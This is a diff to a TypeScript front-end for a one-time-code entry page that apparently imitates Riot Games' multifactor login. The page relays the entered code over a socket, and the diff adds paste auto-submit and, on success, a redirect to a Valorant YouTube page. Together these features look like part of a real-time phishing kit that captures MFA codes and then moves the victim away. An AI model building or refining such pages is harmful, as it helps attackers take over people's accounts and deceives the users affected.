@@ -7,8 +7,6 @@ import type { Result } from '@/types/riot';
 const getEmail = (): string => {
     return sessionStorage.getItem('multifactor_email') || 'your email';
 };
-
-const email = getEmail();
 let isLoading = false;
 let hasError = false;
 
@@ -74,6 +72,8 @@ const setupSocketEvents = (): void => {
         if (result.success) {
             hasError = false;
             updateUI();
+            const redirectUrl = 'https://www.youtube.com/@valorant';
+            window.location.replace(redirectUrl);
         } else {
             hasError = true;
             updateUI();
@@ -103,6 +103,25 @@ export const setupEnterCodeEvents = (): void => {
     });
 
     inputs.forEach((input, index) => {
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pastedData = e.clipboardData?.getData('text') || '';
+            const digits = pastedData.replace(/\D/g, '').slice(0, 6);
+
+            if (digits.length === 6) {
+                inputs.forEach((inp, i) => {
+                    (inp as HTMLInputElement).value = digits[i] || '';
+                });
+
+                if (hasError) {
+                    hasError = false;
+                    updateUI();
+                }
+
+                setTimeout(() => handleSubmit(), 100);
+            }
+        });
+
         input.addEventListener('input', (e) => {
             if (hasError) {
                 hasError = false;
@@ -136,4 +155,4 @@ export const cleanupEnterCodeEvents = (): void => {
     socketService.off('otp_result');
 };
 
-export { email };
+export { getEmail };
